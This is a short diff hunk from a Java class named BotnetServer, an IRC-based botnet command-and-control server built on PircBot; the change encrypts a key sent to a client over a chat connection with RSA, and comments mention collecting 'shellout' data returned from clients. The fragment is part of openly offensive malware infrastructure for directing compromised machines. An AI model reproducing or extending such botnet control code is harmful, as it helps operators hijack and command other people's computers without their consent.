@@ -128,7 +128,7 @@ public class BotnetServer extends PircBot {
 					if (chat == null) {
 						System.out.println("\tThe chat request was rejected.");
 					} else {
-						chat.sendLine("key");
+						chat.sendLine(m.encryptRSA("key"));
 						//use shellout for getting returned data from the client if you need it
 						//use chat.sendLine(s) to send key info
 						String key = m2.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::");
